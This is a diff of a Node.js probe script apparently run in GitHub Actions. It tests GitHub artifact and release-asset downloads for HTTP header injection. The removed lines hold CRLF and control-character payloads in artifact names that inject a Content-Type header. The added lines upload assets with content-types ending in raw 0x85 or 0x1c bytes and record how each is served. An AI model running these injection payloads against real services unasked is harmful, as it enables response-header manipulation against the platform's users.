@@ -1,15 +1,4 @@
 import https from 'node:https';
-import tls from 'node:tls';
-
-const artifactEntry = import.meta.resolve('@actions/artifact');
-const artifactLib = new URL('.', artifactEntry);
-const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
-  import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
-  import(new URL('internal/shared/util.js', artifactLib)),
-  import(new URL('generated/index.js', artifactLib)),
-]);
-const ids = getBackendIdsFromToken();
-const client = internalArtifactTwirpClient({ maxAttempts: 1 });
 
 function request(url, options = {}, body = undefined) {
   return new Promise((resolve, reject) => {
@@ -24,77 +13,78 @@ function request(url, options = {}, body = undefined) {
   });
 }
 
-function rawGet(url) {
-  return new Promise((resolve, reject) => {
-    const target = new URL(url);
-    const socket = tls.connect({ host: target.hostname, port: 443, servername: target.hostname });
-    const chunks = [];
-    socket.on('secureConnect', () => socket.write(Buffer.from([
-      `GET ${target.pathname}${target.search} HTTP/1.1`,
-      `Host: ${target.host}`,
-      'Connection: close',
-      '', '',
-    ].join('\r\n'), 'ascii')));
-    socket.on('data', chunk => chunks.push(chunk));
-    socket.on('end', () => resolve(Buffer.concat(chunks)));
-    socket.on('error', reject);
-  });
-}
+const apiHeaders = {
+  authorization: `Bearer ${process.env.GH_TOKEN}`,
+  accept: 'application/vnd.github.v3+json',
+  'user-agent': 'repo-cassette-probe',
+  'x-github-api-version': '2022-11-28',
+};
+const tag = `probe-${process.env.GITHUB_RUN_ID}`;
+const releaseBody = Buffer.from(JSON.stringify({ tag_name: tag, name: tag, draft: false, prerelease: true }));
+const release = await request(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/releases`, {
+  method: 'POST', headers: { ...apiHeaders, 'content-type': 'application/json', 'content-length': String(releaseBody.length) },
+}, releaseBody);
+if (release.status !== 201) throw new Error(`release create ${release.status}: ${release.body.toString().slice(0, 500)}`);
+const releaseJson = JSON.parse(release.body);
+const uploadBase = releaseJson.upload_url.replace('{?name,label}', '');
 
-const candidates = [
-  ['crlf-inject-fs', `a"\r\nContent-Type: application/json${String.fromCharCode(0x1c)}\r\nX-X: "b.json`],
-  ['lf-inject-fs', `a"\nContent-Type: application/json${String.fromCharCode(0x1c)}\nX-X: "b.json`],
-  ['crlf-inject-nel', `a"\r\nContent-Type: application/json\u0085\r\nX-X: "b.json`],
-  ['raw-fs', `a${String.fromCharCode(0x1c)}b.json`],
-  ['raw-nel', `a\u0085b.json`],
-  ['percent-crlf', 'a%0D%0AContent-Type%3A%20application%2Fjson%1C.json'],
-];
-const results = [];
-for (const [label, name] of candidates) {
+const assetResults = [];
+for (const [label, type] of [
+  ['normal', 'application/octet-stream'],
+  ['raw85', `application/json${String.fromCharCode(0x85)}`],
+  ['raw1c', `application/json${String.fromCharCode(0x1c)}`],
+]) {
+  const payload = Buffer.from(JSON.stringify({ probe: label }));
   try {
-    const created = await client.CreateArtifact({
-      workflowRunBackendId: ids.workflowRunBackendId,
-      workflowJobRunBackendId: ids.workflowJobRunBackendId,
-      name,
-      mimeType: StringValue.create({ value: 'application/octet-stream' }),
-      version: 7,
-    });
-    const uploaded = await request(created.signedUploadUrl, {
-      method: 'PUT',
-      headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/octet-stream', 'Content-Length': '2' },
-    }, Buffer.from('{}'));
-    const finalized = await client.FinalizeArtifact({
-      workflowRunBackendId: ids.workflowRunBackendId,
-      workflowJobRunBackendId: ids.workflowJobRunBackendId,
-      name,
-      size: '2',
-    });
-    const rest = await request(
-      `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`,
-      { headers: { authorization: `Bearer ${process.env.GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'repo-cassette-probe' } },
-    );
-    const location = rest.headers.location || '';
-    const raw = location ? await rawGet(location) : Buffer.alloc(0);
-    const headerEnd = raw.indexOf(Buffer.from('\r\n\r\n'));
-    const headerBytes = headerEnd >= 0 ? raw.subarray(0, headerEnd) : raw.subarray(0, 1000);
-    let parsed = null;
-    try { parsed = location ? await request(location) : null; } catch (error) { parsed = { error: String(error.message) }; }
-    results.push({
+    const uploaded = await request(`${uploadBase}?name=${encodeURIComponent(`${label}.json`)}`, {
+      method: 'POST',
+      headers: { ...apiHeaders, accept: 'application/vnd.github.v3+json', 'content-type': type, 'content-length': String(payload.length) },
+    }, payload);
+    let asset = null;
+    try { asset = JSON.parse(uploaded.body); } catch {}
+    const variants = [];
+    if (asset?.id) {
+      const endpoint = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/releases/assets/${asset.id}`;
+      for (const [variant, suffix, accept] of [
+        ['default', '', 'application/vnd.github.v3+json'],
+        ['download', '?download=1', 'application/vnd.github.v3+json'],
+        ['raw', '?raw=1', 'application/vnd.github.v3+json'],
+        ['octet', '', 'application/octet-stream'],
+      ]) {
+        const first = await request(`${endpoint}${suffix}`, { headers: { ...apiHeaders, accept } });
+        let followed = null;
+        if (first.headers.location) followed = await request(first.headers.location);
+        variants.push({
+          variant,
+          status: first.status,
+          firstTypeHex: Buffer.from(first.headers['content-type'] || '', 'latin1').toString('hex'),
+          locationHost: first.headers.location ? new URL(first.headers.location).host : null,
+          followedStatus: followed?.status || null,
+          followedTypeHex: followed ? Buffer.from(followed.headers['content-type'] || '', 'latin1').toString('hex') : null,
+          payload: Boolean(followed?.body.equals(payload) || first.body.equals(payload)),
+        });
+      }
+      const browser = await request(asset.browser_download_url);
+      variants.push({
+        variant: 'browser', status: browser.status,
+        firstTypeHex: Buffer.from(browser.headers['content-type'] || '', 'latin1').toString('hex'),
+        locationHost: browser.headers.location ? new URL(browser.headers.location).host : null,
+        payload: browser.body.equals(payload),
+      });
+    }
+    assetResults.push({
       label,
-      accepted: true,
-      artifactId: finalized.artifactId,
       uploadStatus: uploaded.status,
-      rscdHex: location ? Buffer.from(new URL(location).searchParams.get('rscd') || '', 'latin1').toString('hex') : null,
-      rawHeaderHex: headerBytes.toString('hex').slice(0, 4000),
-      parsedStatus: parsed?.status || null,
-      parsedTypeHex: parsed?.headers ? Buffer.from(parsed.headers['content-type'] || '', 'latin1').toString('hex') : null,
-      parseError: parsed?.error || null,
+      assetId: asset?.id || null,
+      storedTypeHex: asset?.content_type ? Buffer.from(asset.content_type, 'latin1').toString('hex') : null,
+      response: asset?.id ? null : uploaded.body.toString().slice(0, 500),
+      variants,
     });
   } catch (error) {
-    results.push({ label, accepted: false, error: String(error?.message || error).slice(0, 500) });
+    assetResults.push({ label, error: String(error?.message || error).slice(0, 500) });
   }
 }
 
-const report = JSON.stringify(results);
+const report = JSON.stringify({ releaseId: releaseJson.id, tag, assets: assetResults });
 console.log(report);
-console.log(`::notice title=Artifact name control probe::${report.replaceAll('%', '%25')}`);
+console.log(`::notice title=Release asset raw header probe::${report.replaceAll('%', '%25')}`);
